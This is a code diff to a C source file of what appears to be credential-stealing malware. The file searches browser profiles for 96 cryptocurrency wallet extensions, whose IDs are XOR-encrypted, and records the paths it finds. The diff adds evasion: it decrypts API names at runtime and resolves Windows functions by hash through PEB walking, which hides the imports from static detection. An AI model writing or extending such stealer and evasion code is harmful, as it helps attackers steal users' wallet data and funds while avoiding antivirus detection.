@@ -1,10 +1,32 @@
 #include "wallet_ext.h"
 #include "hash.h"
 #include "browser_paths.h"
+#include "peb.h"
+#include "export_resolve.h"
+#include "enc_strings.h"
 #include <stdlib.h>
 #include <string.h>
 #include <stdio.h>
 #include <windows.h>
+
+typedef DWORD (WINAPI *pGetFileAttributesA_we)(LPCSTR);
+
+static struct {
+    pGetFileAttributesA_we pGFAA;
+    int ready;
+} g_we_k32;
+
+static int we_ensure_k32(void) {
+    if (g_we_k32.ready) return 1;
+    char dll[32]; enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
+    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
+    if (!k32) return 0;
+    char fn[32]; enc_decrypt(enc_GetFileAttributesA, ENC_GETFILEATTRIBUTESA_LEN, fn);
+    g_we_k32.pGFAA = (pGetFileAttributesA_we)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
+    if (!g_we_k32.pGFAA) return 0;
+    g_we_k32.ready = 1;
+    return 1;
+}
 
 // 96 wallet extension IDs and names (XOR-encrypted at compile time)
 static const char *wallet_names[] = {
@@ -135,7 +157,8 @@ WalletExtData *collect_wallet_extensions(const char *app_data, const char *path_
     /* Quick check: does the browser extension dir exist at all? */
     char check_path[512];
     snprintf(check_path, sizeof(check_path), "%s\\%s\\Local Extension Settings", app_data, path_suffix);
-    DWORD base_attr = GetFileAttributesA(check_path);
+    if (!we_ensure_k32()) return NULL;
+    DWORD base_attr = g_we_k32.pGFAA(check_path);
     if (base_attr == INVALID_FILE_ATTRIBUTES) return NULL;
     
     WalletExtData *results = calloc(WALLET_EXT_COUNT, sizeof(WalletExtData));
@@ -147,7 +170,7 @@ WalletExtData *collect_wallet_extensions(const char *app_data, const char *path_
         int written = snprintf(ext_path, sizeof(ext_path), "%s\\%s\\Local Extension Settings\\%s", app_data, path_suffix, wallet_ids[i]);
         if (written < 0 || (size_t)written >= sizeof(ext_path)) continue;
         
-        DWORD attr = GetFileAttributesA(ext_path);
+        DWORD attr = g_we_k32.pGFAA(ext_path);
         if (attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY)) {
             results[found].name = strdup(wallet_names[i]);
             results[found].path = strdup(ext_path);
